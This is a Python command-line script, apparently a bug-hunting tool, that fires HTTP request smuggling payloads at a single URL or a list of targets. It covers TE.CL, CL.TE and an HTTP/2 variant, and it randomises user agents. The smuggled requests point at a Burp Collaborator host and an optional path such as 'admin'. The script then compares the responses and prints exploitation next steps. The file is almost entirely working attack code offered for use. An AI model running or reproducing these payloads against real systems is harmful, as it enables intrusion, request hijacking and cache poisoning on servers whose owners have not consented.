import requests
import argparse
import random
from urllib.parse import urlparse
from colorama import Fore, Style, init

init(autoreset=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]


def ensure_scheme(url):
    parsed_url = urlparse(url)
    if not parsed_url.scheme:
        url = 'http://' + url
    return url


def get_random_user_agent():
    return random.choice(USER_AGENTS)

def te_cl_smuggling(url, collaborator_url, path):
    headers = {
        "Host": urlparse(url).netloc,
        "Transfer-Encoding": "chunked",
        "User-Agent": get_random_user_agent()
    }
    body = (
        "0\r\n"
        f"GET /{path} HTTP/1.1\r\n"
        f"Host: {collaborator_url}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    response = requests.post(url, headers=headers, data=body)

    return response

def cl_te_smuggling(url, collaborator_url, path):
    headers = {
        "Host": urlparse(url).netloc,
        "Content-Length": "4",
        "User-Agent": get_random_user_agent()
    }
    body = (
        f"G\r\n"
        f"GET /{path} HTTP/1.1\r\n"
        f"Host: {collaborator_url}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    response = requests.post(url, headers=headers, data=body)
    return response


def http2_smuggling(url, collaborator_url, path):
    print(f"{Fore.MAGENTA}Performing HTTP/2 Request Smuggling on: {Style.RESET_ALL}{url}")
    headers = {
        "Host": urlparse(url).netloc,
        "TE": "trailers",
        "User-Agent": get_random_user_agent()
    }
    body = (
        f"POST /{path} HTTP/1.1\r\n"
        f"Host: {collaborator_url}\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "0\r\n"
        "SMUGGLED\r\n"
    )
    response = requests.post(url, headers=headers, data=body)
    return response


def te_cl_smuggling1(url, collaborator_url, path1):
    print(f"Performing TE.CL Request Smuggling on: {url}")
    headers = {
        "Host": urlparse(url).netloc,
        "Transfer-Encoding": "chunked",
        "User-Agent": get_random_user_agent()
    }
    body = (
        "0\r\n"
        f"GET /{path1} HTTP/1.1\r\n"
        f"Host: {collaborator_url}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    response = requests.post(url, headers=headers, data=body)
    print(f"Response status code: {Fore.YELLOW}{response.status_code}{Style.RESET_ALL}")
    print("")
    return response


def cl_te_smuggling1(url, collaborator_url, path1):
    print(f"Performing CL.TE Request Smuggling on: {url}")
    headers = {
        "Host": urlparse(url).netloc,
        "Content-Length": "4",
        "User-Agent": get_random_user_agent()
    }
    body = (
        f"G\r\n"
        f"GET /{path1} HTTP/1.1\r\n"
        f"Host: {collaborator_url}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    response = requests.post(url, headers=headers, data=body)
    print(f"Response status code: {Fore.YELLOW}{response.status_code}{Style.RESET_ALL}")
    print("")
    return response


def http2_smuggling1(url, collaborator_url, path1):
    print(f"{Fore.MAGENTA}Performing HTTP/2 Request Smuggling on: {Style.RESET_ALL}{url}")
    headers = {
        "Host": urlparse(url).netloc,
        "TE": "trailers",
        "User-Agent": get_random_user_agent()
    }
    body = (
        f"POST /{path1} HTTP/1.1\r\n"
        f"Host: {collaborator_url}\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "0\r\n"
        "SMUGGLED\r\n"
    )
    response = requests.post(url, headers=headers, data=body)
    print(f"Response status code: {Fore.YELLOW}{response.status_code}{Style.RESET_ALL}")
    return response


def detailed_check1(response1, response2, collaborator_url):
    indicators = False

    if response1.status_code != response2.status_code:
        print(f"{Fore.GREEN}Potential Request Smuggling Detected:{Style.RESET_ALL} Different status codes received")
        indicators = True

    if response1.headers != response2.headers:
        print(f"{Fore.GREEN}Potential Request Smuggling Detected:{Style.RESET_ALL} Different headers received")
        indicators = True

    body_snippet1 = response1.text[:200]
    body_snippet2 = response2.text[:200]
    if body_snippet1 != body_snippet2:
        print(f"{Fore.GREEN}Potential Request Smuggling Detected:{Style.RESET_ALL} Different response bodies received")
        print("")
        print(f"TE.CL Response Body: {body_snippet1}")
        print(f"CL.TE Response Body: {body_snippet2}")
        indicators = True

    if indicators:
        print("")
        print(f"{Fore.GREEN}Next steps:{Style.RESET_ALL}")
        print("1. Check the Burp Collaborator server to see if any unexpected requests were received.")
        print(f"2. Verify if the Collaborator URL {collaborator_url} was accessed during the test.")
        print("3. If you see interactions, it indicates a successful request smuggling attack.")
        print("4. Perform additional tests to understand the impact and potential exploitation paths.")
        print("5. Document the findings and report the vulnerability if confirmed.")
        print("")
    else:
        print(
            f"{Fore.YELLOW}No clear indicators of request smuggling detected. Further manual inspection may be required.{Style.RESET_ALL}")

def detailed_check(response1, response2, url):
    indicators = []

    if response1.status_code != response2.status_code:
        indicators.append("Status Code")

    if response1.headers != response2.headers:
        indicators.append("Headers")

    body_snippet1 = response1.text[:200]
    body_snippet2 = response2.text[:200]
    if body_snippet1 != body_snippet2:
        indicators.append("Response bodies")

    if indicators:
        print(f"""{Fore.GREEN}Potential Request Smuggling Detected at: {Style.RESET_ALL}{url} ---> {', '.join(indicators)}
{Fore.YELLOW}TE.CL Response Body:{Style.RESET_ALL}
{body_snippet1}
                
<----------------------->
 
{Fore.YELLOW}CL.TE Response Body:{Style.RESET_ALL}          
{body_snippet2}
                """)
    else:
        print(
            f"{Fore.YELLOW}No clear indicators of request smuggling detected at {url}. Further manual inspection may be required.{Style.RESET_ALL}")


def process_single_url(url, burp_url):
    url = ensure_scheme(url)
    print("""
    ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
    ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
    ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
    ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
    ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝███████╗
    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 

    By: K, Hacking Notes & ShadowByte                                                                                                  
    """)
    print("Select the option:")
    print(f"{Fore.GREEN}1{Style.RESET_ALL}. HTTP/1.1 Request Smuggling (TE.CL and CL.TE)")
    print(f"{Fore.GREEN}2{Style.RESET_ALL}. HTTP/2 Request Smuggling")
    print("")
    option = input(f"Enter the option number ({Fore.GREEN}1{Style.RESET_ALL} or {Fore.GREEN}2{Style.RESET_ALL}): ")
    print("")
    path1 = input(f"Specify a custom path if desired, e.g., admin ({Fore.GREEN}Default Root Path{Style.RESET_ALL}): ")
    print("")

    if option == "1":
        te_cl_response = te_cl_smuggling1(url, burp_url, path1)
        cl_te_response = cl_te_smuggling1(url, burp_url, path1)
        detailed_check1(te_cl_response, cl_te_response, burp_url)
    elif option == "2":
        http2_response = http2_smuggling1(url, burp_url, path1)
        print(f"HTTP/2 Response Body: {http2_response.text[:200]}")  # Display first 200 characters of response body
        print(f"{Fore.GREEN}Next steps:{Style.RESET_ALL}")
        print("1. Check the Burp Collaborator server to see if any unexpected requests were received.")
        print(f"2. Verify if the Collaborator URL {burp_url} was accessed during the test.")
        print("")

def process_urls_from_file(file_path, burp_url):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()

    print("""
    ██╗  ██╗████████╗████████╗██████╗     ███████╗███╗   ███╗██╗   ██╗ ██████╗  ██████╗ ██╗     ██╗███╗   ██╗ ██████╗ 
    ██║  ██║╚══██╔══╝╚══██╔══╝██╔══██╗    ██╔════╝████╗ ████║██║   ██║██╔════╝ ██╔════╝ ██║     ██║████╗  ██║██╔════╝ 
    ███████║   ██║      ██║   ██████╔╝    ███████╗██╔████╔██║██║   ██║██║  ███╗██║  ███╗██║     ██║██╔██╗ ██║██║  ███╗
    ██╔══██║   ██║      ██║   ██╔═══╝     ╚════██║██║╚██╔╝██║██║   ██║██║   ██║██║   ██║██║     ██║██║╚██╗██║██║   ██║
    ██║  ██║   ██║      ██║   ██║         ███████║██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████╗██║██║ ╚████║╚██████╔╝███████╗
    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝         ╚══════╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ 

    By: K, Hacking Notes & ShadowByte                                                                                                  
    """)

    print("Select the option:")
    print(f"{Fore.GREEN}1{Style.RESET_ALL}. HTTP/1.1 Request Smuggling (TE.CL and CL.TE)")
    print(f"{Fore.GREEN}2{Style.RESET_ALL}. HTTP/2 Request Smuggling")
    print("")
    option = input(f"Enter the option number ({Fore.GREEN}1{Style.RESET_ALL} or {Fore.GREEN}2{Style.RESET_ALL}): ")
    print("")
    path = input(f"Specify a custom path if desired, e.g., admin ({Fore.GREEN}Default Root Path{Style.RESET_ALL}): ")
    print("")


    for url in urls:
        process_urls(url, burp_url, option, path)

    print("")
    print(f"{Fore.GREEN}Next steps:{Style.RESET_ALL}")
    print("1. Check the Burp Collaborator server to see if any unexpected requests were received.")
    print(f"2. Verify if the Collaborator URL {burp_url} was accessed during the test.")
    print("3. If you see interactions, it indicates a successful request smuggling attack.")
    print("4. Perform additional tests to understand the impact and potential exploitation paths.")
    print("5. Document the findings and report the vulnerability if confirmed.")
    print("")


def process_urls(url, burp_url, option, path):
    if option == "1":
        te_cl_response = te_cl_smuggling(url, burp_url, path)
        cl_te_response = cl_te_smuggling(url, burp_url, path)
        detailed_check(te_cl_response, cl_te_response, url)
    elif option == "2":
        http2_response = http2_smuggling(url, burp_url, path)
        print(f"HTTP/2 Response Body: {http2_response.text[:200]}")  # Display first 200 characters of response body
        print("")

def main():
    parser = argparse.ArgumentParser(description="Request Smuggling Script")
    parser.add_argument("-u", "--url", help="Single URL to test")
    parser.add_argument("-f", "--file", help="File containing multiple URLs to test")
    parser.add_argument("-b", "--burp", help="Burp Collaborator URL")
    parser.add_argument("--default", action="store_true", help="Print default message")

    args = parser.parse_args()

    if args.default:
        print(r"""
te_cl_smuggling
        "Host": urlparse(url).netloc,
        "Transfer-Encoding": "chunked",
        "User-Agent": get_random_user_agent()

        "0\r\n"
        "\r\n"
        "GET / HTTP/1.1\r\n"
        "Host: Host.com\r\n"
        "Connection: close\r\n"
        "\r\n"

cl_te_smuggling
        "Host": urlparse(url).netloc,
        "Content-Length": "4",
        "User-Agent": get_random_user_agent()

        "G\r\n"
        "GET / HTTP/1.1\r\n"
        "Host: Host.com\r\n"
        "Connection: close\r\n"
        "\r\n"

http2_smuggling
        "Host": urlparse(url).netloc,
        "TE": "trailers",
        "User-Agent": get_random_user_agent()

        "POST / HTTP/1.1\r\n"
        "Host: Host.com\r\n"
        "Content-Length: 4\r\n"
        "\r\n"
        "0\r\n"
        "SMUGGLED\r\n"
""")
        return

    if not args.burp:
        print("The -b/--burp argument is required unless using --default.")
        return

    if args.url:
        process_single_url(args.url, args.burp)
    elif args.file:
        process_urls_from_file(args.file, args.burp)
    else:
        print("Either a single URL (-u) or a file containing URLs (-f) must be provided.")


if __name__ == "__main__":
    main()
